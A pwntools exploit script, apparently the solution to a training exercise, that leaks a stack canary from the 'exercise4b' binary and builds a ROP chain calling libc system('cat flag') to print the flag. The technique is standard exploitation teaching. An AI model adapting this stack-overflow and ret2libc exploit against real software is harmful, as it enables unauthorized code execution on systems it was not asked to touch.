#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise4b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

MSG_OFFSET = 15
BUFFER_OFFSET = 20
CANARY_LEN = 4

# Set up rop
elf = ELF(exe)
rop = ROP(elf)

r = start()

# Name prompt
out = r.recvline()

# Send "name"
func_arg = b'cat flag'
r.sendline(func_arg)

# Find name addr
name_addr = elf.symbols['name'].to_bytes(8, byteorder='little')

# Send message to leak the canary
init_msg = b'A' * 19 + b'\n'
out = r.recv()
r.send(init_msg)
out = r.recv()
canary = out[MSG_OFFSET + BUFFER_OFFSET:MSG_OFFSET + BUFFER_OFFSET + CANARY_LEN]

# Get the system address
sys_addr = r.libc.symbols['system']
sys_addr = sys_addr.to_bytes(8, byteorder='little')

# Find the rop gadgets
reg_gadget = rop.find_gadget(["pop rdi"])
reg_g_addr = reg_gadget.address.to_bytes(8, byteorder="little")

ret_gadget = rop.find_gadget(["ret"])
ret_g_addr = ret_gadget.address.to_bytes(8, byteorder="little")

# Prepare the exploit message
fin_msg = b'a' * BUFFER_OFFSET + canary + b'\x00' * 16 + reg_g_addr + name_addr + ret_g_addr + sys_addr

# Send the exploit message & receive the flag
r.send(fin_msg)
r.send(b'\n')
out = r.recv()
print(out)

